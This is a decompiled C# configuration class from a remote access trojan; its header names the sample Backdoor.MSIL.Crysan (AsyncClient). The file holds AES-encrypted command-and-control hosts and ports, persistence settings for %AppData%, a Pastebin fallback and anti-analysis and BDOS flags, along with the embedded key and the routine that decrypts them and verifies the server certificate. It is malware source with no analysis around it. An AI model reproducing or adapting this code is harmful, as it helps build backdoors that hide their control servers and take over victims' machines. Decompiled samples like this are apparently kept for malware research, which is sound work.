// Decompiled with JetBrains decompiler
// Type: Client.Settings
// Assembly: AsyncClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A19C81AD-DCA7-4942-AD7B-C0D73F667431
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\Backdoor.MSIL.Crysan.ecy-6bb030430aef2b33ca1f8db61690c001754e9c2dae78e22b11a178959cd4c7a2.exe

using Client.Algorithm;
using Client.Helper;
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client
{
  public static class Settings
  {
    public static string Ports = "TIOx9RDHdWsHH28oIzQl2/eaNj7DYKbf/cauaHMtaj4YTLYT/vUzeF4qRQ8S6ohoX3Gkcq2+Ifmih92if/ZiFw==";
    public static string Hosts = "6ls94pPSJvcAkrFa6ipA5Q2K7tfUnN8NlZYnlCLxOuxZfIg46MPkAgFbYDxzTHyKe/VqYdnYZMvslBCVp5QgFA==";
    public static string Version = "piiwy1+AhDu098j6AxCRWeCUFpELGGV0vgeRc2iRMRPq0IVvJk+KhLA1S4afv8pbFU2hcklPnvXHZQIIi/a0wg==";
    public static string Install = "tzMfDRKHc7Uuk38H46SWsA2kuckByCJ73185LeSO2tx04krfP3An+z3RWWM06WY9lGm66cas95nOkVoDu/7u4g==";
    public static string InstallFolder = "%AppData%";
    public static string InstallFile = "";
    public static string Key = "a2puYjNSVURueTJZdWVCTGZuYnM2Tk1WUDRJeUZld00=";
    public static string MTX = "raZ+hXgawGy3xAqXa/ga34vVy7ScR2jzTVnBRuJQg9nrJVSA6XU8brv/PahdHVMiluFeXWRvK5jmpcbzm2A/pCAn8fwDmxfjwGMDsnG5kwg=";
    public static string Certificate = "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";
    public static string Serversignature = "R5TObEiL2KsyFaNJbkvyxXPCDSicMKNjmDA1lTWkDFWYYOIfbTU3dLBIMF8X2UMVgFy3kmOpQjd0fuUrHqIAaqXz4iMZZkEstnd7NfHfic3KOJeK3KIA8oaKPj4R/U1386H92HJHJN9yhdBZht1q+/wNI3ikzeV2WUcCvwAskQipmDsSg0aWiHk/+ZHDypoSi+C5wGTDpuYapY+AUxlk8EqIkonl9ygibhmCSuAkPSXnuXCl6tSmyi0SaGq+LWA3eKs1Aojs6kihbm1M2TvQzoYi4KdPFOJ0qa7wkSf3gbJIuxj8JH4Aohw0ununvW4bfDfzMQlwGHPJGbuQ1xXvV1EJZaFRRSnooPAf/wI5y5UC7qKB0Rm3PWaWtZh14gNAjDzHNBCgE3go+SkEkjqj1fgL3vDSMcEuq88+0oqV4Yz5qGCh/mowb6pTQHNQBUzmKft/QzfHyJ4ay6k1SjaF5NjDYJ0xtoosqGqaUJft/bOrIG6mzWNZHVFeKNFH/ne22LF7JhHrL8+xRzeC+neoCJwBJDsf82zsruExrNC2efTsacjqjDT3j+8/y1H4fTgdhKB/mMf03fj7h0n5pxGaZAF8DonBBV1+MFVLj1zhqjVrb8jEBs37cIxhVxbAj8fX7YBZvwhX9SVbBsDyJrmY9rQHnWjG8dB6ojP05nloR7fTcMh/hdQCsjs4shqdDgOlvFrQchf0dZO2JnrT/Lzfe2MvX0EJINK1Jigh4SNN6vQhmPcUFg/pb8qsHRZFPjqmTXNRHbW5+ZMCDmsWfRtInuN9qoFGkArFUXrcD9Lv/AvFDxvv7Gtwr8Qc7cyUfSnn4k9m1j9YBrt8DFyGlTt/Qkko3aNfGJ74SxKZocb/JdKZOi/dJATuxjqj5bSiV+ZC+54ZzpRj91a4Ghx7jjLtjnwOgqFLmyJx6EEU90+5xum1NXotNwpRairi0C2O5GiUzCXrmTUT2LXZ9C4nwz7O4w==";
    public static X509Certificate2 ServerCertificate;
    public static string Anti = "s6AWlZAlRy9Y2WYlm4ynXzVr7TkZuC+nuYKOvnDHDrApRl3ScK4LICnP/fsessxW9oTv7DNe8Nh6yV3DCC4BpQ==";
    public static Aes256 aes256;
    public static string Pastebin = "zH6FO6+EUPxqoRZdkAetwyBN7qxCQSCHSp1S6GHsIwfr/m70fn6H0pjomhPdWJ8MPF4sANXS2UEsM688QEiNpg==";
    public static string BDOS = "p8s13scQ87TA4uZ25Bie+jeYwOEi7qVbuUbIJaZqnynHIqHwhNQOwol1+teqdL/oP/76JdY79mkTi2B92CI0IQ==";
    public static string Hwid = (string) null;
    public static string Delay = "3";
    public static string Group = "swOKCwCeG33RUpjAO+B0sLcN2bOXtGkhEtOFfvz+zGAd9iNy2fHUMqY1yB5vsaq7XTiKqH12M4UArDzOHzhY9Q==";

    public static bool InitializeSettings()
    {
      try
      {
        Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
        Settings.aes256 = new Aes256(Settings.Key);
        Settings.Ports = Settings.aes256.Decrypt(Settings.Ports);
        Settings.Hosts = Settings.aes256.Decrypt(Settings.Hosts);
        Settings.Version = Settings.aes256.Decrypt(Settings.Version);
        Settings.Install = Settings.aes256.Decrypt(Settings.Install);
        Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
        Settings.Pastebin = Settings.aes256.Decrypt(Settings.Pastebin);
        Settings.Anti = Settings.aes256.Decrypt(Settings.Anti);
        Settings.BDOS = Settings.aes256.Decrypt(Settings.BDOS);
        Settings.Group = Settings.aes256.Decrypt(Settings.Group);
        Settings.Hwid = HwidGen.HWID();
        Settings.Serversignature = Settings.aes256.Decrypt(Settings.Serversignature);
        Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certificate)));
        return Settings.VerifyHash();
      }
      catch
      {
        return false;
      }
    }

    private static bool VerifyHash()
    {
      try
      {
        return ((RSACryptoServiceProvider) Settings.ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Settings.Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Settings.Serversignature));
      }
      catch (Exception ex)
      {
        return false;
      }
    }
  }
}
